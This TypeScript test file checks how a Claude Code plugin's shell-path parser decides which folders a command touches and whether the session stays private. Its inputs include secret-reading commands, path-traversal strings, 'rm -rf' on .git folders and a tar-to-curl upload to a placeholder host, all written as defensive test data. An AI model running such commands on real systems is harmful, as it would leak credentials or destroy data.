// Copyright 2026 Ix Infrastructure Inc.
//
// Project boundaries without the noise (issue #45), in the mod: which paths a shell command names.
// A device file isn't one; a variable expands only with the value the model's shell has; a program
// (sed, jq, awk, perl -e, sh -c) isn't a path, though the paths written in it are; an unresolved
// path in a first segment still makes the session private, with its own reason; a command that
// may remove a `.git` names it, so a shared folder never covers that folder afterwards. And
// /peers session, typed only.

import { describe, expect, test } from 'claude-code/testing'

import { isMutating, markerExtras, parseMarkerProbe, parsePeersArgs, scratchEnv, sessionShowText, shellPaths, toolPathsAll } from '../hooks/lib'
import { ran, settle, sidOf, slash, start, world, type World } from './world'

const handed = (w: World, verb = 'status') => ran(w, verb).flatMap(r => (r.env?.P2P_PROJECT_DIRS ?? '').split(':').filter(Boolean))
const JOB = '/home/u/.claude/jobs/j-7f3a'
const sp = (command: string, vars: Record<string, string> = {}, untrusted = false) => shellPaths(command, '/w/r', '/home/u', { vars, untrusted })

describe('shell paths: less noise, never a wider boundary (#45)', () => {
  test('2>/dev/null and other device files are no folder of the session', () => {
    expect(sp('ls 2>/dev/null')).toEqual({ paths: [], over: false })
    expect(sp('cmd </dev/zero >/dev/stdout 2>/dev/fd/2 | tee /dev/tty')).toEqual({ paths: [], over: false })
    // Other things under /dev still go to the CLI, which skips only real device files (projects.ts pseudoPath).
    expect(sp('cp x /dev/shm/out').paths).toEqual(['/dev/shm/out'])
  })

  test('a variable expands only with the value the shell has: $CLAUDE_JOB_DIR from the mod, never $TMPDIR', () => {
    expect(sp('cat $CLAUDE_JOB_DIR/tmp/x ${CLAUDE_JOB_DIR}/y.txt', { CLAUDE_JOB_DIR: JOB })).toEqual({ paths: [`${JOB}/tmp/x`, `${JOB}/y.txt`], over: false })
    // Not known (not a background session, or the sandbox's own $TMPDIR): unresolved, said as such.
    expect(sp('cat $CLAUDE_JOB_DIR/tmp/x')).toEqual({ paths: [], over: true, why: ['unresolved'] })
    expect(sp('cat $TMPDIR/x')).toEqual({ paths: [], over: true, why: ['unresolved'] })
    // `$CLAUDE_JOB_DIRX` is another variable.
    expect(sp('cat $CLAUDE_JOB_DIRX/a', { CLAUDE_JOB_DIR: JOB }).over).toBe(true)
  })

  test('widening: a variable the command sets itself is unknown (HOME=…, export, read, for, eval, source), and $PWD after a cd', () => {
    for (const cmd of ['HOME=/work/secret; cat $HOME/keys', 'export HOME=/x; cat $HOME/k', 'read HOME </tmp/h; cat $HOME/k', 'for HOME in /x; do cat $HOME/k; done', 'eval "$(printf X)"; cat $HOME/k', '. ./env.sh && cat $HOME/k', 'source env.sh; cat $HOME/k']) {
      const r = sp(cmd)
      expect([cmd, r.over, r.paths.includes('/home/u')]).toEqual([cmd, true, false])
    }
    expect(sp('CLAUDE_JOB_DIR=/work/secret cat $CLAUDE_JOB_DIR/k', { CLAUDE_JOB_DIR: JOB }).paths).not.toContain(JOB)
    // A cd: relative paths and $PWD are where it went, too (a nested repository there binds).
    const cd = sp('cd /work/api && cat sub/keys.ts $PWD/lib/a.ts')
    expect(cd.paths).toEqual(expect.arrayContaining(['/work/api', '/work/api/sub/keys.ts', '/work/api/lib/a.ts']))
    // ~user, ~+ and ~- are folders the mod doesn't know.
    for (const cmd of ['cat ~root/.ssh/id', 'ls ~+/x', 'cat ~-/k']) expect([cmd, sp(cmd).over]).toEqual([cmd, true])
    // A word that only mentions the name elsewhere ($HOME/source/x, a quoted "$HOME") is still known.
    expect(sp('cat $HOME/source/x.txt').paths).toEqual(['/home/u/source/x.txt'])
  })

  test('the files Claude Code runs before each command (session-env): no variable is known from then on', () => {
    expect(sp("echo 'export HOME=/w/secret' >> ~/.claude/session-env/x/hook.sh").sticky).toBe(true)
    expect(toolPathsAll({ tool: 'Write', file_path: '/home/u/.claude/session-env/s/a.sh', content: 'x' }, '/w/r', '/home/u').sticky).toBe(true)
    expect(sp('cat $HOME/notes.txt', {}, true)).toEqual({ paths: [], over: true, why: ['unresolved'] })
  })

  test('$(…) and backticks: unresolved in a first segment, the folder before it further in, a bare one names nothing; their own paths bind', () => {
    for (const cmd of ['cat $(dirname $0)/secret', 'cat "$(git rev-parse --show-toplevel)/k"', 'cat `pwd`/x']) expect([cmd, sp(cmd)]).toEqual([cmd, { paths: [], over: true, why: ['unresolved'] }])
    expect(sp('cat /work/$(whoami)/f')).toEqual({ paths: ['/work'], over: false })
    expect(sp('echo $(date +%s) `id -u`')).toEqual({ paths: [], over: false })
    expect(sp('echo "$(cat /work/secret/k.txt)"').paths).toEqual(['/work/secret/k.txt'])
    expect(sp('x=$(cat `ls /work/deep/a.txt`)').paths).toEqual(['/work/deep/a.txt'])
  })

  test('sed, jq, awk and inline code are programs, not paths; the paths written inside them still bind', () => {
    // The program itself is `maybe`: the front end binds it only if such a file exists.
    expect(sp("sed -i 's#a/b#c/d#g' src/x.ts")).toEqual({ paths: ['/w/r/src/x.ts'], over: false, maybe: ['/w/r/s#a/b#c/d#g'] })
    // (A bare file name is the session's own folder, bound already: no path of its own.)
    expect(sp("sed -e 's|/usr/lib|/opt/lib|' -e 's/x/y/' conf.txt")).toEqual({ paths: [], over: false, maybe: ['/w/r/s|/usr/lib|/opt/lib|', '/w/r/s/x/y'] })
    expect(sp("jq -r '.a/b | .c' data.json")).toEqual({ paths: [], over: false, maybe: ['/w/r/.a/b | .c'] })
    expect(sp("jq --arg k v -f ./prog.jq ../in.json").paths).toEqual(['/w/r/prog.jq', '/w/in.json'])
    expect(sp("awk -F: '{print $1/2}' /etc/passwd")).toMatchObject({ paths: ['/etc/passwd'], over: false })
    // The paths written inside: sed's r command, python's open, sh -c.
    expect(sp("sed 'r /work/secret/keys.txt' notes.txt").paths).toContain('/work/secret/keys.txt')
    expect(sp("python3 -c \"print(open('/work/secret/k').read())\"").paths).toContain('/work/secret/k')
    expect(sp("sh -c 'cat /work/secret/k'").paths).toContain('/work/secret/k')
    expect(sp("perl -ne 'print if /x/' /work/secret/log").paths).toContain('/work/secret/log')
    expect(sp("ruby -e 'puts File.read(\"../secret/k\")'").paths).toContain('/w/secret/k')
  })

  test('widening: code in double quotes that expands the shell\'s own variable is still unresolved', () => {
    expect(sp('sh -c "cat $X/keys"')).toMatchObject({ over: true, why: ['unresolved'] })
    expect(sp('python3 -c "open(\'$X/k\')"').over).toBe(true)
  })

  test('widening: a word in a program\'s place that doesn\'t look like a program stays a path (unsure: a path)', () => {
    // `sed` named as an argument, then a path: no program shape, so it binds.
    expect(sp('echo sed /work/secret/k').paths).toContain('/work/secret/k')
    expect(sp('ls jq ./secret-dir/a').paths).toContain('/w/r/secret-dir/a')
    expect(sp('cat sed sub/secret').paths).toContain('/w/r/sub/secret')
    // A sed address (not s or y) in the program's place is read as before.
    expect(sp("sed -n '/start/,/end/p' f.txt").paths.length).toBeGreaterThan(0)
  })

  test('widening: a command that may delete a .git without naming it names <folder>/.git for each folder', () => {
    for (const cmd of ['find /work/old -name .git -exec rm -rf {} +', 'find /work/old -delete', 'ls /work/old | xargs rm -rf', 'shopt -s dotglob; rm -rf /work/old/*', 'rm -rf /work/old/*(D)', "python3 -c \"import shutil; shutil.rmtree('/work/old/'+'.git')\"", 'rsync -a --delete empty/ /work/old/']) {
      expect([cmd, sp(cmd).paths]).toEqual([cmd, expect.arrayContaining(['/work/old/.git'])])
    }
    // Named outright, the path itself carries it (the CLI never lets a shared folder cover that folder).
    expect(sp('rm -rf /work/old/.git').paths).toEqual(['/work/old/.git'])
    expect(sp('rm -rf /work/old/{.git,a}').paths).toEqual(['/work/old/{.git,a}'])
    expect(sp('rm -rf /work/old/.g*').paths).toEqual(['/work/old/.g*'])
    // A plain listing doesn't.
    expect(sp('find /work/old -name "*.ts"').paths).toEqual(['/work/old'])
  })

  test('an assignment names its folder (T=/x/y), though $T later is unresolved', () => {
    expect(sp('T=/work/scratch/run1; cat $T/out.txt')).toEqual({ paths: ['/work/scratch/run1'], over: true, why: ['unresolved'] })
  })

  test('Ian\'s case: `$T/…` paths and 2>/dev/null tell the CLI "unresolved", never a cap, and hand it no /dev', async ($, on) => {
    const w = world(on, { gitTop: '/work/web', env: { CLAUDE_JOB_DIR: JOB } })
    await start($, w)
    await $.tool.call({ tool: 'Bash', tool_use_id: 'i1', command: 'T=$CLAUDE_JOB_DIR/tmp; mkdir -p $T && cat $T/notes.md 2>/dev/null' } as never)
    await $.tool.call({ tool: 'Bash', tool_use_id: 'i2', command: 'ls /work/api /work/lib 2>/dev/null' } as never)
    await settle(w, () => ran(w, 'status').some(r => r.env?.P2P_PROJECT_DIRS_OVER !== undefined) && handed(w).includes('/work/lib'))
    expect(ran(w, 'status').at(-1)?.env?.P2P_PROJECT_DIRS_OVER).toBe('unresolved')
    const dirs = handed(w)
    expect(dirs).toEqual(expect.arrayContaining([`${JOB}/tmp`, '/work/api', '/work/lib']))
    expect(dirs.some(d => d.startsWith('/dev'))).toBe(false)
  })

  test('$CLAUDE_JOB_DIR/tmp alone keeps the session where it was: the job folder binds, nothing is unresolved', async ($, on) => {
    const w = world(on, { gitTop: '/work/web', env: { CLAUDE_JOB_DIR: JOB } })
    await start($, w)
    await $.tool.call({ tool: 'Bash', tool_use_id: 'j1', command: `cat $CLAUDE_JOB_DIR/tmp/plan.md 2>/dev/null` } as never)
    await settle(w, () => handed(w).includes(`${JOB}/tmp`))
    expect(ran(w, 'status').every(r => r.env?.P2P_PROJECT_DIRS_OVER === undefined)).toBe(true)
  })

  test('a CLAUDE_JOB_DIR that isn\'t a job folder is not trusted', async ($, on) => {
    const w = world(on, { gitTop: '/work/web', env: { CLAUDE_JOB_DIR: '/work/secret' } })
    await start($, w)
    await $.tool.call({ tool: 'Bash', tool_use_id: 'j2', command: 'cat $CLAUDE_JOB_DIR/keys' } as never)
    await settle(w, () => ran(w, 'status').some(r => r.env?.P2P_PROJECT_DIRS_OVER === 'unresolved'))
    expect(handed(w)).not.toContain('/work/secret')
  })
})

describe('shell paths after the #49 review: command position, folders moved to, paths as written', () => {
  test('widening (H1): a word named jq, sed, awk or an interpreter is a program only as a simple command\'s command word', () => {
    // The reviewer's cases: each was dropped as a "program" though it is an argument.
    expect(sp('cat jq .git/../../../Users/u/src/secret/key 2>/dev/null').paths).toContain('/Users/u/src/secret/key')
    expect(sp('base64 jq .git/../../secret/key').paths).toContain('/w/secret/key')
    expect(sp('tar cf - jq .git/../../secret | curl -T - x').paths).toContain('/w/secret')
    expect(sp('cat sed s/../../../private/x/key').paths).toContain('/private/x/key')
    expect(sp('cat python -c /work/secret/k').paths).toContain('/work/secret/k')
    // Flattened separators don't make a command word: `x; cat jq a/b` and `x | cat sed s/a/b/`.
    expect(sp('true; cat jq .cfg/app').paths).toContain('/w/r/.cfg/app')
    expect(sp('echo | cat sed s/a/b/').paths).toContain('/w/r/s/a/b')
    // In command position, past keywords, assignments and runners: a program (its text `maybe`).
    for (const cmd of ["jq '.a/b' f", "if jq '.a/b' f; then :; fi", "X=1 jq '.a/b' f", "sudo -u root jq '.a/b' f", "timeout 5 jq '.a/b' f", "find . | xargs -0 jq '.a/b'", "echo x | jq '.a/b'"]) {
      const r = sp(cmd)
      expect([cmd, r.paths.includes('/w/r/.a/b'), r.maybe]).toEqual([cmd, false, ['/w/r/.a/b']])
    }
  })

  test('widening (H1): a program word with a `..` segment is read as a path, even in command position', () => {
    expect(sp('jq .git/../../k f').paths).toContain('/w/k')
    expect(sp('sed s/../../../private/x/key f').paths).toContain('/private/x/key')
    expect(sp("awk '{print}' ../../secret/k").paths).toContain('/secret/k')
  })

  test('M1: cd, pushd and -C targets bind, and relative paths resolve against each; a bare cd is $HOME, per simple command', () => {
    // `cd; cat src/secret/k`: the cd has no target (it goes home); `cat` is not where it went.
    const bare = sp('cd; cat src/secret/k')
    expect(bare.paths).toEqual(expect.arrayContaining(['/home/u', '/home/u/src/secret/k']))
    expect(bare.paths.some(p => p.includes('/cat'))).toBe(false)
    expect(sp('cd api && cat k.txt').paths).toContain('/w/r/api')
    // One after another: each relative to the one before.
    expect(sp('cd a && cd b && cat ../c/k').paths).toEqual(expect.arrayContaining(['/w/r/a', '/w/r/a/b', '/w/r/a/c/k']))
    expect(sp('pushd /work/x && cat y/z; popd').paths).toEqual(expect.arrayContaining(['/work/x', '/work/x/y/z']))
    for (const [cmd, dir] of [['git -C /src/secret.repo log -p', '/src/secret.repo'], ['git -C repo log', '/w/r/repo'], ['git --git-dir=/x/r/.git log', '/x/r/.git'], ['make -C sub all', '/w/r/sub'], ['make --directory=../sib', '/w/sib'], ['tar -C /work/out -xf a.tgz', '/work/out'], ['env -C /work/e cat k', '/work/e'], ['sudo -D /work/s cat k', '/work/s']] as const) {
      expect([cmd, sp(cmd).paths]).toEqual([cmd, expect.arrayContaining([dir])])
    }
    // A target it can't place: unresolved (private), never cwd.
    for (const cmd of ['cd -', 'cd $X && cat k', 'cd ~other', 'cd "$(git rev-parse --show-toplevel)"', 'popd', 'pushd', 'git -C $R log', 'env -C $D cat k']) {
      expect([cmd, sp(cmd).why]).toEqual([cmd, ['unresolved']])
    }
    // A known variable is fine.
    expect(sp('cd $HOME/proj && cat a').paths).toContain('/home/u/proj')
  })

  test('M4: a folder with a dot in its name binds itself, never its parent; a file is passed as written', () => {
    expect(sp('ls /src/secret.repo').paths).toEqual(['/src/secret.repo'])
    expect(sp('cat /src/secret.repo/notes.md').paths).toEqual(['/src/secret.repo/notes.md'])
  })

  test('H2: the marker of the repository a path is in binds too (the probe), so a shared folder never covers it once deleted', async ($, on) => {
    const clone = '/home/u/src/team/tmp'
    const w = world(on, { gitTop: '/work/web', markerProbe: paths => ({ exists: [], markers: paths.some(p => p.startsWith(clone)) ? [`${clone}/.git`] : [] }) })
    await start($, w)
    await $.tool.call({ tool: 'Read', tool_use_id: 'm1', file_path: `${clone}/secret.txt` } as never)
    await settle(w, () => handed(w).includes(`${clone}/.git`))
    expect(handed(w)).toEqual(expect.arrayContaining([clone, `${clone}/.git`]))
  })

  test('H2: when the probe fails, every path binds as its own folder (<path>/.git), and every program word too', async ($, on) => {
    const w = world(on, { gitTop: '/work/web', markerProbe: null })
    await start($, w)
    await $.tool.call({ tool: 'Bash', tool_use_id: 'm2', command: "cat /home/u/src/team/k.txt && jq '.a/b' f" } as never)
    await settle(w, () => handed(w).includes('/home/u/src/team/k.txt/.git'))
    expect(handed(w)).toEqual(expect.arrayContaining(['/home/u/src/team/k.txt', '/home/u/src/team/k.txt/.git', '/work/web/.a/b']))
  })

  test('H1: a program word that names a file that exists binds it (the probe says so); one that doesn\'t, doesn\'t', async ($, on) => {
    const w = world(on, { gitTop: '/work/web', markerProbe: paths => ({ exists: paths.filter(p => p === '/work/web/.cfg/app'), markers: [] }) })
    await start($, w)
    await $.tool.call({ tool: 'Bash', tool_use_id: 'm3', command: "jq .cfg/app data.json; jq '.x/y' data.json; cat /work/other/z" } as never)
    await settle(w, () => handed(w).includes('/work/other/z'))
    expect(handed(w)).toContain('/work/web/.cfg/app')
    expect(handed(w)).not.toContain('/work/web/.x/y')
  })

  test('/peers project share --subfolders is passed to the CLI only when typed', () => {
    expect(parsePeersArgs('project share c_team --subfolders')).toEqual({ verb: 'project', args: ['share', 'c_team', '--subfolders'] })
    expect(parsePeersArgs('project share c_team')).toEqual({ verb: 'project', args: ['share', 'c_team'] })
  })

  test('linear on hostile input (CodeQL js/polynomial-redos): many newlines, and a brace with many commas', () => {
    let t = performance.now()
    expect(sp('\n'.repeat(50_000))).toEqual({ paths: [], over: false })
    expect(performance.now() - t).toBeLessThan(100)
    t = performance.now()
    expect(sp(`rm -rf {{,${','.repeat(50_000)}`).paths).toEqual([])
    expect(performance.now() - t).toBeLessThan(100)
    // Still read as before: eval after a newline or a keyword, and a brace with a choice.
    expect(sp('\n\n  eval "$x"; cat $HOME/k').over).toBe(true)
    expect(sp('if x; then eval y; fi; cat $HOME/k').over).toBe(true)
    expect(sp('rm -rf {.git,a}; cat /work/old/f').paths).toContain('/work/old/f/.git')
  })

  test('markerExtras: the probe\'s markers and the maybe paths that exist; no answer fails closed', () => {
    expect(markerExtras(['/a/b'], ['/w/.x'], { exists: ['/w/.x'], markers: ['/a/.git'] })).toEqual(['/a/.git', '/w/.x'])
    expect(markerExtras(['/a/b'], ['/w/.x'], { exists: [], markers: [] })).toEqual([])
    expect(markerExtras(['/a/b', '/w/.x'], ['/w/.x'], undefined)).toEqual(['/w/.x', '/a/b/.git'])
    expect(parseMarkerProbe('{}')).toBeUndefined()
    expect(parseMarkerProbe('{"exists":["rel"],"markers":[]}')).toBeUndefined()
    expect(parseMarkerProbe('{"exists":[],"markers":["/a/.git"]}')).toEqual({ exists: [], markers: ['/a/.git'] })
  })
})

describe('/peers session: this session\'s bindings, for the person', () => {
  test('parsed, and typed only', () => {
    expect(parsePeersArgs('session')).toEqual({ verb: 'session' })
    expect(parsePeersArgs('session show')).toEqual({ verb: 'session' })
    expect(parsePeersArgs('session other-sid')).toMatchObject({ verb: 'usage' })
    expect(isMutating(parsePeersArgs('session'))).toBe(true)
  })

  test('typed: runs p2p session show for this session with the person token; shows projects, reasons and remedy, peer text inert', async ($, on) => {
    const token = 'S'.repeat(43)
    const w = world(on, { personToken: token })
    w.cli['session show'] = {
      body: {
        session: {
          sid: 'x',
          policy: 'private',
          reasons: [{ cause: 'unresolved', why: "a command it ran named a path Peer2Peer couldn't resolve" }],
          remedy: "sharing a project can't change that, and it lasts until the session ends: start a new session for the work you want to share",
          projects: [{ name: 'src', kind: 'dir', root: '/home/u/src', policy: 'shared', circles: [{ cid: 'c_team', name: 'team‮evil', joined: true }], people: [], under: ['/home/u/src/tmp'] }],
          constraints: 0,
        },
      },
    }
    await start($, w)
    const r = await slash($, 'peers', 'session')
    const text = JSON.stringify(r)
    const run = ran(w, 'session', 'show').at(-1)
    expect(run?.env?.P2P_PERSON_TOKEN).toBe(token)
    // This session's own id, after `--` (never another session's).
    expect(run?.argv.slice(-2)).toEqual(['--', sidOf(w)])
    expect(text).toContain("couldn't resolve")
    expect(text).toContain('start a new session')
    expect(text).toContain('/home/u/src')
    expect(text).not.toContain('‮')
  })

  test('not typed (the model, a peer): refused, and nothing runs', async ($, on) => {
    const w = world(on)
    await start($, w)
    const r = await slash($, 'peers', 'session', 'model')
    expect(JSON.stringify(r)).toContain('Only your user reads')
    expect(ran(w, 'session', 'show')).toHaveLength(0)
  })

  test('sessionShowText: a session bound to nothing yet, and a shared one', () => {
    expect(sessionShowText({ policy: 'none', projects: [], reasons: [] })).toContain('not bound to any project yet')
    expect(sessionShowText({ policy: 'shared', projects: [{ name: 'web', kind: 'git', remote: 'github.com/acme/web', policy: 'shared', circles: [{ cid: 'c_t', name: 'team', joined: true }] }], reasons: [] })).toContain('web (git github.com/acme/web): shared with circle team')
  })
})

describe("this session's own scratch: the mod names it, the CLI checks it", () => {
  test('scratchEnv: the engine session id, Claude Code\'s config and temporary roots, and a job folder only with its shape', () => {
    const j = JSON.parse(scratchEnv({ sid: 'ec76abec-0b12-44d8-977c-705a1cdb2537', home: '/home/u', tmp: [undefined, '/tmp/', '/tmp', 'relative/tmp'], job: '/home/u/.claude/jobs/ec76abec' }) ?? '{}')
    expect(j).toEqual({ sid: 'ec76abec-0b12-44d8-977c-705a1cdb2537', tmp: ['/tmp'], config: '/home/u/.claude', job: '/home/u/.claude/jobs/ec76abec' })
    // CLAUDE_CONFIG_DIR wins over <home>/.claude.
    expect(JSON.parse(scratchEnv({ sid: 'ec76abec-0b12', config: '/cfg/claude', home: '/home/u', tmp: [] }) ?? '{}').config).toBe('/cfg/claude')
    // A CLAUDE_JOB_DIR that isn't a job folder is left out (the CLI also wants it in <config>/jobs, named by the id's start).
    expect(JSON.parse(scratchEnv({ sid: 'ec76abec-0b12', home: '/home/u', tmp: [], job: '/work/secret' }) ?? '{}').job).toBeUndefined()
    // No engine session id, or one of another shape: nothing, so nothing is skipped.
    for (const sid of [undefined, '', '../x', 'short', 'a b c d e f g h']) expect(scratchEnv({ sid, home: '/home/u', tmp: ['/tmp'] })).toBeUndefined()
    expect(scratchEnv({ sid: 'ec76abec-0b12', tmp: [] })).toBeUndefined()
  })

  test('every binding run carries it, for this engine session', async ($, on) => {
    const w = world(on, { gitTop: '/work/web', env: { HOME: '/home/u', CLAUDE_JOB_DIR: JOB, TMPDIR: '/var/tmp/x' } })
    await start($, w)
    await $.tool.call({ tool: 'Read', tool_use_id: 's1', file_path: `/tmp/claude-1000/-work-web/${w.sessionId}/tasks/b1.output` } as never)
    await settle(w, () => handed(w).some(d => d.includes('/tasks')))
    const run = ran(w, 'status').at(-1)
    expect(JSON.parse(run?.env?.P2P_SESSION_SCRATCH ?? '{}')).toEqual({ sid: w.sessionId, tmp: ['/var/tmp/x', '/tmp'], config: '/home/u/.claude', job: JOB })
    // The folder still goes to the CLI, which decides on real paths (a symlink out binds its target).
    expect(handed(w)).toContain(`/tmp/claude-1000/-work-web/${w.sessionId}/tasks`)
  })
})
